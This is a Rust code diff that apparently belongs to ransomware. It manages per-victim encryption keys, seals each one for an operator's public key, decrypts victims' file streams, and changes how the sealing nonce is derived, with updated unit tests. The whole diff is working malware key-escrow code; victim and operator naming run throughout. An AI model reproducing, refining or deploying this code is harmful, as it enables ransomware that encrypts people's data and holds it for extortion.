@@ -67,22 +67,22 @@ impl PerVictimKey {
         let identity_proof =
             Auth::compute_to_vec(self.secret_key.clone(), &self.victim_id.as_bytes());
         let kdf = kdf::Kdf::from_parts(self.secret_key.clone(), kdf::Context::default());
-        let mut sk1: [u8; 32] = kdf.derive_subkey(1).unwrap();
-        let mut sk2: [u8; 32] = kdf.derive_subkey(2).unwrap();
-        let ephemeral_key = dryocbox::KeyPair::from_seed(&sk2);
+        let mut ekp_seed: [u8; 32] = kdf.derive_subkey(2).unwrap();
+        let ephemeral_key = dryocbox::KeyPair::from_seed(&ekp_seed);
+        let mut nonce = dryocbox::Nonce::new_byte_array();
+        crypto_box_seal_nonce(&mut nonce, &ephemeral_key.public_key, &OPERATOR_PUBLIC_KEY.into());
         let mut sealed = ephemeral_key.public_key.to_vec();
         sealed.append(
             &mut DryocBox::encrypt_to_vecbox(
                 &self.secret_key,
-                &sk1[0..24].try_into().unwrap(),
+                &nonce,
                 &OPERATOR_PUBLIC_KEY.into(),
                 &ephemeral_key.secret_key,
             )
             .unwrap()
             .to_vec(),
         );
-        sk1.zeroize();
-        sk2.zeroize();
+        ekp_seed.zeroize();
         format!(
             "{}:{}:{}",
             self.victim_id,
@@ -90,6 +90,14 @@ impl PerVictimKey {
             bs58::encode(&sealed).into_string()
         )
     }
+}
+
+fn crypto_box_seal_nonce(nonce: &mut dryocbox::Nonce, epk: &dryocbox::PublicKey, rpk: &dryocbox::SecretKey) {
+    use dryoc::classic::crypto_generichash::{crypto_generichash_init, crypto_generichash_update, crypto_generichash_final};
+    let mut state = crypto_generichash_init(None, 24).expect("state");
+    crypto_generichash_update(&mut state, epk);
+    crypto_generichash_update(&mut state, rpk);
+    crypto_generichash_final(state, nonce).expect("hash error");
 }
 
 pub struct EncryptedStreamHeader {
@@ -190,7 +198,7 @@ mod tests {
         );
         assert_eq!(
             key.seal_for_operator(),
-            "01234567-89ab-cdef-0123-456789abcdef:6M1m2bucY4682YNiteZ3mCfkMhzmS1ygec8DV2nLtdrS:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5A9E5YCwDUcTbtxVeV4DhgA5TV8sr6qqapJw1q5fCfAAfSmrrSe6Mr7rC8KYD4KgPoLs"
+            "01234567-89ab-cdef-0123-456789abcdef:6M1m2bucY4682YNiteZ3mCfkMhzmS1ygec8DV2nLtdrS:zTLxgEp5TKuaVf7oRRuF3TkubA3Th87jhVa9kgU3c5AAsvzw4VusXTHgJBTRbmQDNFKBk5NgfKbXdsRgsNhu1eCHUbrgYuTqAjyogdrnmPXvA"
         );
     }
     #[test]
@@ -211,5 +219,13 @@ mod tests {
         let mut output = std::io::Cursor::new(Vec::new());
         decrypt_stream(&key, &header, &mut input, &mut output).unwrap();
         assert_eq!(output.into_inner(), vec![0x11; 1379])
+    }
+    #[test]
+    fn test_per_victim_key_dump_parse() {
+        let key = PerVictimKey::generate(uuid::uuid!("01234567-89ab-cdef-0123-456789abcdef"));
+        let dumped = key.dump();
+        let parsed = PerVictimKey::parse(&dumped).unwrap();
+        assert_eq!(key.secret_key, parsed.secret_key);
+        assert_eq!(key.victim_id, parsed.victim_id);
     }
 }
